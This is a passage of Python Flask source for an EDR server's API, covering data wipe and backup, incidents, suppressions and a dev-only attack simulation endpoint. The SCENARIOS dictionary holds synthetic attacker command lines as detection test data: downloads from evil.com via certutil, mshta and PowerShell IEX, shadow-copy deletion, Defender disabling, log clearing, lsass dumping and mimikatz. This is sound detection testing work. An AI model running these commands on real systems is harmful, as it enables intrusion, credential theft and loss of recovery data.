    if entry is None:
        write_audit(g.user, "clear_denied", "invalid or expired token", request.remote_addr)
        return jsonify({"error": "Invalid or expired token — call /api/clear/request again"}), 403

    token_owner, expires = entry
    if time.time() > expires:
        write_audit(g.user, "clear_denied", "token expired", request.remote_addr)
        return jsonify({"error": "Token expired — call /api/clear/request again"}), 403

    # Token must be redeemed by the same user who requested it
    if token_owner != g.user:
        write_audit(g.user, "clear_denied",
                    f"token owned by {token_owner}", request.remote_addr)
        return jsonify({"error": "Token was issued for a different user"}), 403

    # ── Database backup before wipe (NEW) ────────────────────────────────
    db_backup_path = ""
    try:
        from behedr_server.backup_manager import create_backup
        db_backup_path = create_backup(reason="pre-clear")
        if db_backup_path:
            print(f"[CLEAR] Database backup created: {db_backup_path}")
    except Exception as e:
        print(f"[CLEAR] Database backup failed: {e}")

    # ── JSON export backup (keep existing functionality) ─────────────────
    backup_path = ""
    try:
        from behedr_server.config import DATA_DIR
        backup_data = export_all()
        ts = int(time.time())
        backup_path = os.path.join(DATA_DIR, f"clear_backup_{ts}.json")
        import json as _json
        with open(backup_path, "w", encoding="utf-8") as bf:
            _json.dump(backup_data, bf)
        print(f"[CLEAR] JSON backup written to {backup_path} "
              f"({len(backup_data['events'])} events, {len(backup_data['alerts'])} alerts)")
    except Exception as e:
        print(f"[CLEAR] JSON backup failed (proceeding anyway): {e}")

    # ── Wipe ─────────────────────────────────────────────────────────────
    clear_all()
    _graphs.clear()
    _seen_keys.clear()
    _seen_fifo.clear()
    from behedr_server.database.storage import _conn, _write_lock
    with _write_lock:
        _conn().execute("DELETE FROM incidents")
        _conn().execute("DELETE FROM suppressions")
        _conn().commit()

    write_audit(g.user, "clear_all",
                f"all data wiped; db_backup={db_backup_path}; json_backup={backup_path}",
                request.remote_addr)
    print(f"[CLEAR] All data wiped by {g.user}")
    return jsonify({
        "status":           "cleared",
        "db_backup_file":   db_backup_path or "backup_failed",
        "json_backup_file": backup_path or "backup_failed",
    }), 200


@api_bp.route("/api/backup/status", methods=["GET"])
@require_jwt("viewer")
def api_backup_status():
    """Get backup system status and list of available backups."""
    try:
        from behedr_server.backup_manager import get_backup_status
        status = get_backup_status()
        return jsonify(status), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@api_bp.route("/api/backup/create", methods=["POST"])
@require_jwt("admin")
def api_backup_create():
    """Manually create a database backup."""
    try:
        from behedr_server.backup_manager import create_backup
        backup_path = create_backup(reason="manual")

        if backup_path:
            write_audit(g.username, "backup_create", f"manual backup: {backup_path}", request.remote_addr)
            return jsonify({
                "status": "success",
                "backup_path": backup_path,
                "size": os.path.getsize(backup_path)
            }), 200
        else:
            return jsonify({"error": "Backup creation failed"}), 500

    except Exception as e:
        return jsonify({"error": str(e)}), 500


@api_bp.route("/api/backup/restore", methods=["POST"])
@require_jwt("admin")
def api_backup_restore():
    """
    Restore database from a backup file.

    Body: {"backup_path": "/path/to/backup.db"}

    CAUTION: This overwrites the current database!
    """
    try:
        data = request.get_json(silent=True) or {}
        backup_path = data.get("backup_path", "").strip()

        if not backup_path:
            return jsonify({"error": "backup_path required"}), 400

        from behedr_server.backup_manager import restore_backup
        success = restore_backup(backup_path)

        if success:
            write_audit(g.username, "backup_restore", f"restored from: {backup_path}", request.remote_addr)
            return jsonify({"status": "success", "message": "Database restored"}), 200
        else:
            return jsonify({"error": "Restore failed"}), 500

    except Exception as e:
        return jsonify({"error": str(e)}), 500


@api_bp.route("/api/health", methods=["GET"])
@require_jwt("viewer")
def api_health():
    """Get comprehensive health status of server and all agents."""
    try:
        from behedr_server.health_monitor import get_health_status
        status = get_health_status()
        return jsonify(status), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@api_bp.route("/api/health/agent/<system_id>", methods=["GET"])
@require_jwt("viewer")
def api_agent_health(system_id):
    """Get health status for a specific agent."""
    try:
        from behedr_server.health_monitor import get_agent_health
        status = get_agent_health(system_id)
        return jsonify(status), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@api_bp.route("/api/export", methods=["GET"])
@require_jwt("analyst")
def api_export():
    fmt  = request.args.get("format", "json").lower()
    data = export_all()
    write_audit(g.user, "export", fmt, request.remote_addr)
    if fmt == "csv":
        out = io.StringIO()
        w   = csv.DictWriter(out, fieldnames=[
            "id", "system_id", "process", "risk_level", "risk_score",
            "confidence", "reason", "technique", "timestamp",
        ])
        w.writeheader()
        for a in data["alerts"]:
            w.writerow(a)
        return Response(out.getvalue(), mimetype="text/csv",
                        headers={"Content-Disposition": "attachment; filename=alerts.csv"})
    else:
        return jsonify(data), 200


# ═════════════════════════════════════════════════════════════════════════════
# PRIORITY 2: ADVANCED THREAT INTELLIGENCE & PREDICTIVE SCORING API
# ═════════════════════════════════════════════════════════════════════════════

@api_bp.route("/api/threat_intel/stats", methods=["GET"])
@require_jwt("viewer")
def api_threat_intel_stats():
    """Get threat intelligence statistics."""
    try:
        from behedr_server.core.threat_intel_enhanced import get_stats
        stats = get_stats()
        return jsonify(stats), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@api_bp.route("/api/threat_intel/check", methods=["POST"])
@require_jwt("analyst")
def api_threat_intel_check():
    """Check IOC against all threat feeds."""
    try:
        from behedr_server.core.threat_intel_enhanced import check_enhanced
        d = request.get_json(silent=True) or {}

        matches = check_enhanced(
            ip=d.get("ip", ""),
            domain=d.get("domain", ""),
            hash_val=d.get("hash", ""),
            url=d.get("url", ""),
        )

        return jsonify({"matches": matches, "count": len(matches)}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@api_bp.route("/api/predictions/<system_id>", methods=["GET"])
@require_jwt("viewer")
def api_get_prediction(system_id):
    return jsonify({"available": False, "error": "Feature not implemented in this prototype"}), 503


@api_bp.route("/api/predictions", methods=["GET"])
@require_jwt("viewer")
def api_get_all_predictions():
    return jsonify({"available": False, "error": "Feature not implemented in this prototype"}), 503


@api_bp.route("/api/attack_chain/<system_id>", methods=["GET"])
@require_jwt("viewer")
def api_get_attack_chain(system_id):
    return jsonify({"available": False, "error": "Feature not implemented in this prototype"}), 503


@api_bp.route("/api/attack_chain/<system_id>", methods=["DELETE"])
@require_jwt("analyst")
def api_clear_attack_chain(system_id):
    return jsonify({"available": False, "error": "Feature not implemented in this prototype"}), 503


@api_bp.route("/api/alert/<int:alert_id>/explain", methods=["GET"])
@require_jwt("viewer")
def api_explain_alert(alert_id):
    """Get detailed explanation for an alert."""
    try:
        from behedr_server.core.explainable_ai import explain_alert
        from behedr_server.database.storage import _conn

        # Get alert
        alert = _conn().execute(
            "SELECT * FROM alerts WHERE id=?", (alert_id,)
        ).fetchone()

        if not alert:
            return jsonify({"error": "Alert not found"}), 404

        alert_dict = dict(alert)

        # Get associated event
        event = _conn().execute(
            "SELECT * FROM events WHERE system_id=? AND child=? "
            "ORDER BY ABS(timestamp - ?) LIMIT 1",
            (alert_dict["system_id"], alert_dict["process"], alert_dict.get("timestamp", 0))
        ).fetchone()

        if not event:
            return jsonify({"error": "Associated event not found"}), 404

        event_dict = dict(event)

        # Generate explanation
        scores = {"L1_Exact": (alert_dict.get("risk_score", 0), [alert_dict.get("reason", "")])}
        explanation = explain_alert(alert_dict, event_dict, scores)

        return jsonify(explanation), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# End of Priority 2 API endpoints

# ── Public ────────────────────────────────────────────────────────────────────

@api_bp.route("/health")
def health():
    from behedr_server.notifier import is_configured
    return jsonify({
        "status":        "ok",
        "version":       "EDR-4.0-commercial",
        "ts":            int(time.time()),
        "notifications": is_configured(),
    }), 200


# ── SSE live stream  (browser connects with ?apikey=<key> or ?token=<jwt>) ────

@api_bp.route("/stream")
def stream():
    """
    SSE endpoint. Browser EventSource cannot set custom headers, so auth is
    passed as a query parameter:
      ?apikey=<API_KEY>   — agent/dashboard shared key (same as API-Key header)
      ?token=<jwt>        — JWT bearer token (viewer role or above)
    Rejects unauthenticated connections.
    """
    authenticated = False

    # Option 1: shared API key (matches what the dashboard already uses)
    qkey = request.args.get("apikey", "").strip()
    if qkey and qkey == API_KEY:
        authenticated = True

    # Option 2: JWT token (viewer role minimum)
    if not authenticated:
        from behedr_server.auth import _decode_jwt
        token = request.args.get("token", "").strip()
        if not token:
            auth = request.headers.get("Authorization", "")
            if auth.startswith("Bearer "):
                token = auth[7:]
        if token:
            try:
                claims = _decode_jwt(token)
                ROLE_RANK = {"viewer": 0, "analyst": 1, "admin": 2}
                if ROLE_RANK.get(claims.get("role", ""), -1) >= ROLE_RANK["viewer"]:
                    authenticated = True
            except ValueError:
                pass

    if not authenticated:
        return jsonify({"error": "Unauthorized — pass ?apikey=<key> or ?token=<jwt>"}), 401

    def gen():
        try:
            snap = {
                "type":    "snapshot",
                "systems": get_systems(),
                "alerts":  get_alerts(limit=20),
                "events":  get_events(limit=50),
                "stats": {
                    **get_alert_stats(),
                    "total_events": get_event_count(),
                    "total_alerts": alert_count(),
                },
            }
            yield f"event: snapshot\ndata: {json.dumps(snap)}\n\n"
        except Exception:
            pass

        while True:
            try:
                alert = alert_q.get(timeout=20)
                yield f"event: alert\ndata: {json.dumps(alert)}\n\n"
            except queue.Empty:
                yield ": keep-alive\n\n"
            except GeneratorExit:
                break

    return Response(
        stream_with_context(gen()),
        mimetype="text/event-stream",
        headers={
            "Cache-Control":               "no-cache",
            "X-Accel-Buffering":           "no",
            "Access-Control-Allow-Origin": "*",
        },
    )


# ── Attack simulation ─────────────────────────────────────────────────────────

def _mk(sid, parent, child, pid, cmdline="", sha256=""):
    return {"system_id": sid, "event": "process_spawn",
            "parent": parent, "child": child, "pid": pid,
            "cmdline": cmdline, "sha256": sha256,
            "time": int(time.time())}

SCENARIOS = {
    "phishing": lambda s: [
        _mk(s, "explorer.exe",   "winword.exe",    1000),
        _mk(s, "winword.exe",    "powershell.exe", 1001,
            "-nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"),
        _mk(s, "powershell.exe", "cmd.exe",        1002, "/c whoami && net user"),
        _mk(s, "cmd.exe",        "certutil.exe",   1003,
            "-urlcache -split -f http://evil.com/payload.exe"),
    ],
    "ransomware": lambda s: [
        _mk(s, "explorer.exe", "vssadmin.exe", 2000, "delete shadows /all /quiet"),
        _mk(s, "cmd.exe",      "bcdedit.exe",  2002, "/set {default} recoveryenabled No"),
        _mk(s, "cmd.exe",      "wmic.exe",     2003, "shadowcopy delete"),
    ],
    "credential": lambda s: [
        _mk(s, "cmd.exe", "procdump.exe",  5000, "-ma lsass.exe lsass.dmp"),
        _mk(s, "cmd.exe", "mimikatz.exe",  5001, "sekurlsa::logonpasswords"),
    ],
    "lolbin": lambda s: [
        _mk(s, "winword.exe",   "mshta.exe",      4000, "http://evil.com/payload.hta"),
        _mk(s, "mshta.exe",     "regsvr32.exe",   4001,
            "/s /n /u /i:http://evil.com/payload.sct scrobj.dll"),
        _mk(s, "regsvr32.exe",  "powershell.exe", 4002, "bypass -enc aQBlAHgA"),
    ],
    "c2": lambda s: [
        _mk(s, "svchost.exe",   "cmd.exe",        3000),
        _mk(s, "cmd.exe",       "powershell.exe", 3001,
            "-nop -noprofile -windowstyle hidden -enc aQBlAHgA"),
        _mk(s, "powershell.exe","certutil.exe",   3002,
            "-urlcache -f http://c2.evil.com/beacon"),
    ],
    "defender_disable": lambda s: [
        _mk(s, "cmd.exe",       "powershell.exe", 11000,
            "Set-MpPreference -DisableRealtimeMonitoring $true"),
        _mk(s, "powershell.exe","cmd.exe",         11001,
            "/c reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender "
            "/v DisableAntiSpyware /t REG_DWORD /d 1"),
    ],
    "log_clearing": lambda s: [
        _mk(s, "cmd.exe", "wevtutil.exe",   12000, "cl Security"),
        _mk(s, "cmd.exe", "wevtutil.exe",   12001, "cl System"),
        _mk(s, "cmd.exe", "powershell.exe", 12002, "Clear-EventLog -LogName Application"),
    ],
    "persistence": lambda s: [
        _mk(s, "cmd.exe", "reg.exe",      8000,
            r"add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Malware /d C:\malware.exe"),
        _mk(s, "cmd.exe", "schtasks.exe", 8001,
            "/create /tn Malware /tr C:\\malware.exe /sc onlogon"),
        _mk(s, "cmd.exe", "sc.exe",       8002, "create MalwareService binPath= C:\\malware.exe"),
    ],
    "recon": lambda s: [
        _mk(s, "cmd.exe", "whoami.exe",    9000, "/all"),
        _mk(s, "cmd.exe", "systeminfo.exe",9002),
        _mk(s, "cmd.exe", "net.exe",       9003, "user /domain"),
        _mk(s, "cmd.exe", "nltest.exe",    9004, "/domain_trusts"),
    ],
    "browser_exploit": lambda s: [
        _mk(s, "explorer.exe", "chrome.exe",     7000),
        _mk(s, "chrome.exe",   "powershell.exe", 7001,
            "-nop IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"),
    ],
    "ioc_hit": lambda s: [
        # Simulates a process whose name is in the IOC feed
        _mk(s, "explorer.exe", "mimikatz.exe", 9900, "sekurlsa::logonpasswords"),
    ],
    "normal": lambda s: [
        _mk(s, "explorer.exe", "chrome.exe",   6000),
        _mk(s, "explorer.exe", "notepad.exe",  6001),
        _mk(s, "explorer.exe", "calc.exe",     6002),
        _mk(s, "services.exe", "svchost.exe",  6004),
    ],
}


@api_bp.route("/simulate", methods=["POST"])
@require_jwt("analyst")
def simulate():
    """
    Attack simulation — ONLY available when EDR_DEV_MODE=true.
    Never expose this endpoint in production: it injects synthetic attack
    events directly into the detection pipeline and can trigger auto-kill
    of real processes if an attacker gains analyst JWT access.
    """
    import os as _os
    if _os.environ.get("EDR_DEV_MODE", "false").lower() != "true":
        return jsonify({
            "error": "Simulation endpoint is disabled in production. "
                     "Set EDR_DEV_MODE=true to enable (dev/test environments only)."
        }), 403

    d        = request.get_json(silent=True) or {}
    scenario = d.get("scenario", "phishing")
    sid      = d.get("system_id", "DEMO-PC")

    if scenario == "all":
        batches = [fn(sid) for fn in SCENARIOS.values()]
    elif scenario in SCENARIOS:
        batches = [SCENARIOS[scenario](sid)]
    else:
        return jsonify({"error": f"Unknown scenario. Valid: {sorted(SCENARIOS)}"}), 400

    def run():
        for batch in batches:
            for ev in batch:
                _pipeline(ev)
                time.sleep(0.3)
            time.sleep(0.8)

    threading.Thread(target=run, daemon=True).start()
    write_audit(g.user, "simulate", scenario, request.remote_addr)
    return jsonify({"status": "started", "scenario": scenario, "system_id": sid}), 200


# ── Init on load ──────────────────────────────────────────────────────────────
init_detector()
load_iocs()


# ═════════════════════════════════════════════════════════════════════════════
# SUPPRESSION ENDPOINTS  (false positive management)
# ═════════════════════════════════════════════════════════════════════════════

@api_bp.route("/api/suppressions", methods=["GET"])
@require_jwt("viewer")
def list_suppressions():
    """List all active suppression rules."""
    sid  = request.args.get("system_id")
    rows = get_suppressions(system_id=sid)
    return jsonify({"suppressions": rows, "count": len(rows)}), 200


@api_bp.route("/api/suppressions", methods=["POST"])
@require_jwt("analyst")
def add_suppression_endpoint():
    """
    Add a suppression rule — marks an alert pattern as false positive.
    Body: { system_id, child, reason_prefix }
    reason_prefix: the beginning of the reason string to suppress.
    Example: { "system_id": "DESKTOP-01", "child": "powershell.exe",
               "reason_prefix": "HEURISTIC: Web request" }
    """
    d             = request.get_json(silent=True) or {}
    system_id     = d.get("system_id", "").strip()
    child         = d.get("child", "").strip().lower()
    reason_prefix = d.get("reason_prefix", "").strip()

    if not system_id or not child or not reason_prefix:
        return jsonify({"error": "system_id, child, and reason_prefix required"}), 400

    ok = add_suppression(system_id, child, reason_prefix, added_by=g.user)
    if not ok:
        return jsonify({"error": "Suppression rule already exists"}), 409

    write_audit(g.user, "add_suppression",
                f"{system_id}:{child}:{reason_prefix[:60]}", request.remote_addr)
    return jsonify({"status": "added", "system_id": system_id,
                    "child": child, "reason_prefix": reason_prefix}), 201


@api_bp.route("/api/suppressions/<int:suppression_id>", methods=["DELETE"])
@require_jwt("analyst")
def delete_suppression(suppression_id: int):
    """Remove a suppression rule — re-enables that alert pattern."""
    ok = remove_suppression(suppression_id)
    if not ok:
        return jsonify({"error": "Suppression not found"}), 404
    write_audit(g.user, "remove_suppression",
                str(suppression_id), request.remote_addr)
    return jsonify({"status": "removed"}), 200


@api_bp.route("/api/alerts/<int:alert_id>/suppress", methods=["POST"])
@require_jwt("analyst")
def suppress_alert(alert_id: int):
    """
    One-click false positive: given an alert ID, automatically create a
    suppression rule for its system_id + process + reason prefix.
    This is the 'Mark as False Positive' button in the dashboard.
    """
    from behedr_server.database.storage import _conn
    row = _conn().execute(
        "SELECT * FROM alerts WHERE id=?", (alert_id,)).fetchone()
    if not row:
        return jsonify({"error": "Alert not found"}), 404

    alert     = dict(row)
    system_id = alert["system_id"]
    child     = alert["process"]
    # Use first 60 chars of reason as prefix — specific enough to avoid
    # suppressing different alerts on the same process
    reason_prefix = alert["reason"][:60]

    ok = add_suppression(system_id, child, reason_prefix, added_by=g.user)
    write_audit(g.user, "suppress_alert",
                f"alert#{alert_id} {system_id}:{child}", request.remote_addr)

    # Also update the incident status if this alert is part of one
    try:
        from behedr_server.database.incidents import get_incidents, update_incident_status
        incs = get_incidents(system_id=system_id, status="open")
        for inc in incs:
            import json as _json
            ids = _json.loads(inc.get("alert_ids", "[]"))
            if alert_id in ids and len(ids) == 1:
                update_incident_status(inc["id"], "false_positive", g.user)
    except Exception:
        pass

    return jsonify({
        "status": "suppressed" if ok else "already_suppressed",
        "system_id": system_id,
        "child": child,
        "reason_prefix": reason_prefix,
    }), 200


# ═════════════════════════════════════════════════════════════════════════════
# INCIDENT ENDPOINTS
# ═════════════════════════════════════════════════════════════════════════════

@api_bp.route("/api/incidents", methods=["GET"])
@require_jwt("viewer")
@rate_limit("api_incidents", per_minute=120)
def list_incidents():
    """List all incidents, optionally filtered by status or system."""
    status    = request.args.get("status")
    system_id = request.args.get("system_id")
    limit     = min(int(request.args.get("limit", 100)), 500)
    rows      = get_incidents(status=status, system_id=system_id, limit=limit)
    stats     = incident_stats()
    return jsonify({
        "incidents": rows,
        "count": len(rows),
        "stats": stats,
    }), 200


@api_bp.route("/api/incidents/<int:incident_id>", methods=["GET"])
@require_jwt("viewer")
def get_incident_detail(incident_id: int):
    """Full incident detail including all member alerts."""
    inc = get_incident(incident_id)
    if not inc:
        return jsonify({"error": "Incident not found"}), 404
    alerts = get_incident_alerts(incident_id)
    return jsonify({"incident": inc, "alerts": alerts}), 200


@api_bp.route("/api/incidents/<int:incident_id>/status", methods=["PATCH"])
@require_jwt("analyst")
def update_incident(incident_id: int):
    """
    Update incident status.
    Body: { "status": "investigating" | "resolved" | "false_positive" | "open" }
    """
    d      = request.get_json(silent=True) or {}
    status = d.get("status", "").lower()
    if not update_incident_status(incident_id, status, g.user):
        return jsonify({"error": "Invalid status or incident not found"}), 400
    write_audit(g.user, "update_incident",
                f"#{incident_id} → {status}", request.remote_addr)
    return jsonify({"status": "updated", "incident_id": incident_id,
                    "new_status": status}), 200


@api_bp.route("/api/incidents/stats", methods=["GET"])
@require_jwt("viewer")
def get_incident_stats():
    """Summary counts: open / investigating / resolved / false_positive."""
    return jsonify(incident_stats()), 200


@api_bp.route("/api/dll_stats/<system_id>", methods=["GET"])
@require_jwt("viewer")
def api_dll_stats(system_id: str):
    """DLL load statistics for a system — shows suspicious DLL loads."""
    from behedr_server.core.dll_monitor import get_dll_stats
    return jsonify(get_dll_stats(system_id)), 200


@api_bp.route("/api/sequence_stats/<system_id>", methods=["GET"])
@require_jwt("viewer")
def api_sequence_stats(system_id: str):
    """Process pair frequency stats for a system — ML baseline info."""
    from behedr_server.core.sequence_ml import get_stats
    return jsonify(get_stats(system_id)), 200
